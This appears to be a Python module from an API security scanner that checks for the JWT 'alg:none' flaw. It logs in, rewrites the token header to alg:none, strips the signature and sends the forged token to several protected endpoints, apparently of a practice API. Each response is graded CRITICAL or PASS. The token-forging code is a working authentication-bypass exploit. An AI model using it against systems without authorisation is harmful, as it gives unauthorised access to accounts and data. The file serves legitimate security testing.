import requests
import base64
import json

def make_none_alg_token(valid_token):
    try:
        parts = valid_token.split(".")
        if len(parts) != 3:
            return None

        # Decode header, set alg to none
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b"=").decode()

        # Keep original payload, empty signature
        return f"{new_header}.{parts[1]}."
    except Exception as e:
        print(f"[JWT] Token manipulation failed: {e}")
        return None

def check_jwt_none_algorithm(config):
    base_url = config["target"]["base_url"]
    findings = []

    # Get a valid token first
    login_resp = requests.post(
        base_url + config["auth"]["login_url"],
        json=config["auth"]["test_credentials"],
        timeout=5
    )

    if login_resp.status_code != 200:
        findings.append({
            "check": "JWT None Algorithm",
            "severity": "ERROR",
            "endpoint": config["auth"]["login_url"],
            "method": "POST",
            "detail": "Could not obtain valid token to test"
        })
        return findings

    valid_token = login_resp.json().get("token") or login_resp.json().get("access_token")
    none_token  = make_none_alg_token(valid_token)

    if not none_token:
        findings.append({
            "check": "JWT None Algorithm",
            "severity": "ERROR",
            "endpoint": "N/A",
            "method": "N/A",
            "detail": "Failed to craft none-algorithm token"
        })
        return findings

    # Test against protected endpoints
    test_endpoints = [
        ("/identity/api/v2/user/dashboard", "GET"),
        ("/workshop/api/shop/products", "GET"),
        ("/identity/api/v2/vehicle/vehicles", "GET"),
    ]

    for path, method in test_endpoints:
        headers = {"Authorization": f"Bearer {none_token}"}
        resp = requests.request(method, base_url + path, headers=headers, timeout=5)

        if resp.status_code == 200:
            findings.append({
                "check": "JWT None Algorithm",
                "severity": "CRITICAL",
                "endpoint": path,
                "method": method,
                "detail": "Server accepted token with alg:none — signature verification bypassed"
            })
        else:
            findings.append({
                "check": "JWT None Algorithm",
                "severity": "PASS",
                "endpoint": path,
                "method": method,
                "detail": f"Correctly rejected none-algorithm token with {resp.status_code}"
            })

    return findings